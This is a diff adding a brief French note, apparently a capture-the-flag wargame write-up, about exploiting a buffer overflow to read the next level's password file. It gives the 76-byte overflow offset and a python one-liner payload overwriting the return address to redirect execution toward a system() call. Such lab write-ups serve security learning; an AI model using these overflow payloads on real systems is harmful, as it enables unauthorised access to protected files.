@@ -1,0 +1,10 @@
+Pour lire le pass du level3, 
+je vais injecte du code avec un debordement de tampon.
+
+je vais mettre system("<commande pour lire .pass>");
+
+je vais chercher a partir d'ou j'ai le DebordTp.
+
+python -c 'print "A" * 76'; provoque le core dump a partir de 76
+
+python -c 'print "A" * 76 + "\x44\x84\x04\x08"';
